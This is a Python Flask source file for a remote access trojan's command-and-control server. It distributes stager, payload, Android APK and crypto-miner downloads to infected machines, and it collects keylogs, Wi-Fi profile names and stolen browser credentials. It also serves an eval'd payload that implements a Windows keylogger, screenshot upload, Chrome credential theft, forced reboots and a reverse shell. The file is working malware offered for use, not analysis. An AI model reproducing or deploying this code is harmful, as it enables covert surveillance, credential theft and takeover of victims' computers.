import platform
from flask import request, render_template
from flask import Flask , request, redirect, render_template , sessions, session, url_for, send_from_directory, send_file
from werkzeug.utils import secure_filename
from werkzeug.datastructures import  FileStorage
import os
import main_db
from datetime import date
import subprocess

app = Flask(__name__, static_folder='{0}/static'.format(os.getcwd()), template_folder='{0}/templates'.format(os.getcwd()))
app.config['SCREENSHOT_FOLDER'] = "./static/screenshots"
app.secret_key= os.urandom(24).hex()

### READ SERVER_CONFIG.CFG TO GET IP AND PORT ###
with open("./server.cfg", "r") as cfg:
    ip = '{0}'.format(cfg.readline()[7:].strip())
    port = '{0}'.format(cfg.readline()[5:].strip())

###  CREATE DIRECTORIES IF NOT ALREADY EXISTS ###
if os.path.isdir("./static/windows"):
    pass
else:
    os.mkdir("./static/windows")

if os.path.isdir("./static/linux"):
    pass
else:
    os.mkdir("./static/linux")

if os.path.isdir("./static/screenshots"):
    pass
else:
    os.mkdir("./static/screenshots")

if os.path.isdir("./static/macos"):
    pass
else:
    os.mkdir("./static/macos")

### CHECK IF NUITKA, REQUESTS, PSUTIL, pyautogui, PIL IS INSTALLED ###

if platform.uname()[0] == "Linux":
    proc = subprocess.Popen(["python3 -m nuitka"], stdout=subprocess.PIPE, shell=True)
    out = proc.communicate()
    if str(out) == "b''":
            print("Nuitka is not installed, attempting to install all required Module from pip")
            os.system("pip3 install nuitka")
            os.system("pip3 install requests")
            os.system("pip3 install psutil")
            os.system("pip3 install pyautogui")
            os.system("pip3 install PIL")
            os.system("pip3 install gzip")

            proc = subprocess.Popen(["python3 -m nuitka"], stdout=subprocess.PIPE, shell=True)
            out, err = proc.communicate()
            if str(out) == "b''":
                    print("Nuitka is still not installed, make sure python3 is installed on your system.")
            else:
                    print("Nuitka seems to be installed")
    else:
            print("Nuitka seems to be installed")

elif platform.uname()[0] == "Windows":
    print("function not completed yet")
        
### CHANGE STAGER.PY AND PAYLOAD.PY MASTER IP ###

linelist = []
linelist2 = []

with open("./stager.py", "r+") as stagerfile:
    for line in stagerfile.readlines():
        linelist.append(line)
with open("./stager.py", "w") as stagerfile:
    for line in linelist:
        if line == '_WEB_SERVER =\n':
            stagerfile.write('_WEB_SERVER = "{0}:{1}"\n'.format(ip, port))
        else:
            stagerfile.write(line)
    stagerfile.close()

print("""  _____            _         _               
 |  __ \          | |       (_)              
 | |  | |_ __ __ _| | ____ _ _ _ __   __ _   
 | |  | | '__/ _` | |/ / _` | | '_ \ / _` |  
 | |__| | | | (_| |   < (_| | | | | | (_| |  
 |_____/|_|  \__,_|_|\_\__,_|_|_| |_|\__,_|  
   _____ ______ _______      ________ _____  
  / ____|  ____|  __ \ \    / /  ____|  __ \ 
 | (___ | |__  | |__) \ \  / /| |__  | |__) |
  \___ \|  __| |  _  / \ \/ / |  __| |  _  / 
  ____) | |____| | \ \  \  /  | |____| | \ \ 
 |_____/|______|_|  \_\  \/   |______|_|  \_\
                                             
                                             """)
import time
time.sleep(3)

### needed for eval command from stager ###
_SERVER = "{0}:{1}".format(ip, port)

### UNFINISHED HTML GUI C&C ###
@app.route('/admin')
def mainn():
    rats = []
    for rat in main_db.get_rat_list():
        print(rat)
        rats.append(rat)
    return render_template("admin.html".format(os.getcwd()), rats=rats)

### LINUX WATHCDOG DOWNLOAD ###
@app.route('/downloads/linux/stager')
def download_linux_stager():
    print(request.user_agent.string)
    return send_file('./static/linux/stager', as_attachment=True)

### LINUX PAYLOAD DOWNLOAD ###
@app.route('/downloads/linux/payload')
def download_linux_payload():
    print(request.user_agent.string)
    return send_file('./static/linux/payload', as_attachment=True)

### ANDROID PAYLOAD DOWNLOAD ###
@app.route('/android')
def download_linzzux_payload():
    print(request.user_agent.string)
    return send_file("./static/linux/zz.apk", as_attachment=True)

### WINDOWS STAGER DOWNLOAD ###
@app.route('/downloads/windows/stager')
def download_windows_stager():
    print(request.user_agent.string)
    return send_file('./static/windows/stager.exe', as_attachment=True)

### WINDOWS PAYLOAD DOWNLOAD ###
@app.route('/downloads/windows/payload')
def download_windows_payload():
    print(request.user_agent.string)
    return send_file('./static/windows/payload.exe', as_attachment=True)

### DOWNLOAD MINERS ###
@app.route('/downloads/linux/phoenixminer')
def download_linux_phoenixminer():
    print(request.user_agent.string)
    return send_file('./static/linux/PhoenixMiner_5.7b_Linux.zip', as_attachment=True)

### REGISTER LINK, PARAMS IP, USER, OS ###
@app.route('/register/<ip>/<user>/<os>/<uuid>', methods=['POST', 'GET'])
def register(ip, user, os, uuid):
    if ip == "None":
        return "None"
    else:
        print(ip + ' ' + user + ' ' + os + ' ' + uuid)
        today = date.today()
        _REGISTERED_DATE = today.strftime("%m/%d/%y")
        _LAST_SEEN_DATE = today.strftime("%m/%d/%y")
        main_db.register(ip, user, os, _REGISTERED_DATE, _LAST_SEEN_DATE, uuid)
        #main_db.create_user_credentials(uuid.replace('-', ''))
        main_db.create_user_keylog_table(uuid)
        main_db.create_user_wifilisttable(uuid)
        print('created users')
        return 'none'

### CHECK IF REGISTERED, PARAMS IP, USERNAME ###
@app.route('/check_if_registered/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
def check_if_registered(ip, user, uuid):
    print('checking if user is registered alrdy')
    try:
        if ip == "None":
            return 0
        if main_db.check_rat_exists(ip, user, uuid) != None:
            print('he exists')
            print(request.remote_addr)
            print('true')
            return 'True'
        else:
            print('fffrue')
            return 'False'

    except TypeError:
        return redirect(register(ip, user, uuid))

### CHECK FOR COMMAND LINK ###
@app.route('/command/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
def command(ip, user,  uuid):
    today = date.today()
    command = '{0}'.format(main_db.get_user_command(ip, user, uuid))
    main_db.remove_user_command(ip, user,  uuid)
    main_db.update_user_lastseendate(ip, user, uuid, today.strftime("%m/%d/%y"))
    print(command)
    return command

### INSERT KEYLOGS INTO DATABASE ###
@app.route('/keylogger/<ip>/<user>/<uuid>/<log>', methods=['POST', 'GET'])
def keylogger(ip, user,  uuid, log):
    print(log)
    main_db.insert_user_keylog(uuid, log)
    
    return "None"

### CHECK FOR A MASS COMMAND LINK ###
@app.route('/mass/<ip>/<user>', methods=['POST', 'GET'])
def mass_(ip, user): 
    command = '{0}'.format(main_db.get_user_command(ip, user))
    main_db.remove_user_command(ip, user)
    print(command)
    return command

### COMMAND LINKS ###

@app.route('/wifi_name/<uuid>/<wifi_name>', methods=['POST', 'GET'])
def insert_wifi_name(uuid, wifi_name):
    main_db.insert_user_wifi(uuid, wifi_name)
    print('created ')

@app.route('/browser_creds/<uuid>/<site_name>/<username>/<password>', methods=['POST', 'GET'])
def insert_browser_creds(uuid, site_name, username, password):
    main_db.insert_user_credentials(uuid, site_name, username, password)

    print(site_name)
    print(username)
    print(password)

    return 'nothing'
    

### REVERSE SHELL, CHECK FOR A SERVER ###
@app.route('/rshell/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
def rshell_(ip, user,  uuid): 
    master_ip = '{0}'.format(main_db.get_rshell_master(ip, user,  uuid))
    master_port = '{0}'.format(main_db.get_rshell_master_port(ip, user,  uuid))
    return master_ip + " " + master_port

### GET YOUR IP ###
@app.route('/getip', methods=['POST', 'GET'])
def get_ip(): 
    return str(request.remote_addr)

#################################################
def check_token(key):
    print(key)
    f = open('tokens', 'r')
    token_list = []
    for token in f.readlines():
        token_list.append(token[:-1])
        f.close()
    print(token_list)
    if key in token_list:
        print('yup')
        return 1
    else:
        return 0

### once the link is clicked the link will no longer be avail ###
@app.route('/inf/<key>', methods=['GET']) 
def information_grabber(key):
    if check_token(key) == 1:
        ### remove token code here ####
        f = open('tokens', 'r')
        token_list = []
        for token in f.readlines():
            token_list.append(token[:-1])
            f.close()
        for token in token_list:
            if token == key:
                token_list.remove(token)
        os.remove("./tokens")
        f = open('tokens', 'a')
        for token in token_list:
            f.write('{0}\n'.format(token))
        f.close()
        print(token_list)
        print(request.headers)
        print(request.headers['User-Agent'])
        
        ### infor grabber code here ###
        return 'something'
    else:
        return 'nothing'
################################################################

###  GET IFRAME OF FILE SYSTEM ###
@app.route('/iframe', methods=['GET'])
def get_iframe():
    return """<!DOCTYPE html>
<html>
<body>

<script>
navigator.geolocation.getCurrentPosition((loc) => {
  console.log('The location in lat lon format is: [', loc.coords.latitude, ',', loc.coords.longitude, ']');
})
</script>

</body>
</html>

"""
### Eval Payloads ###

### Main Payload ###'

@app.route('/remote', methods=['GET'])

def remote():
    return """
global keylogger
keylogger = 0


def register():
    try:
        requests.get(_REG_URL + '/{0}/{1}/{2}/{3}'.format(_MY_IP, username, _OS, current_machine_id ))
    except Exception as e:
        pass

#   CHECK IF RAT IS ALREADY REGISTERED  #
def chk_register():
    try:

        if requests.get(_CHECK_IF_REGISTERED + '/{0}/{1}/{2}'.format(_MY_IP, username, current_machine_id)).content.decode('utf8') == 'True':
            return 1
        else:
            return 0
    except requests.exceptions.ConnectionError as e:
        
        pass
        
def wait_for_command():
    def start_keylogger():

        global keylogger
        keylogger = 1

        GetAsyncKeyState = cdll.user32.GetAsyncKeyState

        special_keys = {0x08: "BS", 0x09: "Tab", 0x0d: "Enter", 0x10: "Shift", 0x11: "Ctrl", 0x12: "Alt", 0x14: "CapsLock", 0x1b: "Esc", 0x20: "Space", 0x2e: "Del"}
        log = []
        logstring = ""

        # reset key states
        for i in range(256):
            GetAsyncKeyState(i)

        while keylogger == 1:
            if len(log) >= 25:
                # UPLOAD LOG HERE #
                for character in log:
                    logstring = logstring + character
                requests.get('http://{0}/keylogger/{1}/{2}/{3}/{4}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id, logstring))
                logstring = ""
                    
                log = []
            for i in range(256):
                if GetAsyncKeyState(i) & 1:
                    if i in special_keys:
                        print("<%s>" % special_keys[i],)
                    elif 0x30 <= i <= 0x5a:
                        ### characters a-z/0-9 ###
                        log.append("%c" % i,)
                        print(log)

                    else:
                        print("[%02x]" % i,)
            sys.stdout.flush()
    try:
        time.sleep(random.randrange(5, 15))
        command = requests.get(_CHECK_FOR_COMMAND + '/{0}/{1}/{2}'.format(_MY_IP, username, current_machine_id)).content.decode('utf8')
        if command == ' ':
            pass
        
        if command == "screenshot":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                date_time = datetime.now().strftime('%Y-%m-%d--%H-%M-%S')
                snapshot = ImageGrab.grab()
                save_path = r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time)
                snapshot.save(save_path)
                upload_screenshot(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
                os.remove(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
        
        if command == "camshot":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                pass

        if command == "reboot":
            if _OS == "Linux":
                subprocess.call("reboot")

            elif _OS == "Windows":
                subprocess.call("shutdown -R")

        
        if command == "record":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                pass

        if command == "rshell":
                t1 = threading.Thread(None, _RSHELL_OPT_)
                t1.start()


        if command == "reboot":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                subprocess.call("shutdown -R")

        if command == "killswitch":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                subprocess.call("shutdown -R")

        if command == "getwifi":
            if _OS == "Linux":
                pass
            
            elif _OS == "Windows":
                meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
                data = meta_data.decode('utf-8', errors ="backslashreplace")
                data = data.split("\\n")
                names = []
                
                for i in data:
                    if "All User Profile" in i :
                        i = i.split(":")
                        i = i[1]
                        i = i[1:-1]

                        names.append(i)
                        
                for name in names:
                    insert_wifi_name(name)
        
        if command == "keylogger":
            if _OS == "Linux":
                pass
            
            elif _OS == "Windows":
                t1 = threading.Thread(None, start_keylogger)
                t1.start()

        if command == "keylogger off":
            if _OS == "Linux":
                pass
            
            elif _OS == "Windows":
                global keylogger
                keylogger = 0
        
        if command == "get_chrome":
            if _OS == "Linux":
                pass
            
            elif _OS == "Windows":
                t1 = threading.Thread(None, get_chrome_credentials)
                t1.start()
        
        if command == "tv_youtube":
            if _OS == "Linux":
                pass
            
            elif _OS == "Windows":
                t1 = threading.Thread(None, get_chrome_credentials)
                t1.start()

    except requests.exceptions.ConnectionError:
        pass
    except FileNotFoundError:
        pass
   
def exec_command(command):
    cmd = shlex.split(command)
    subprocess.call(cmd)

username = getpass.getuser()
if username == 'root':
    root = 1

while 1:
    if chk_register() == 1:
        while 1:
            wait_for_command()
            
    else:
        register()
        continue
        
"""

app.run(host=ip, port=port, threaded=True)
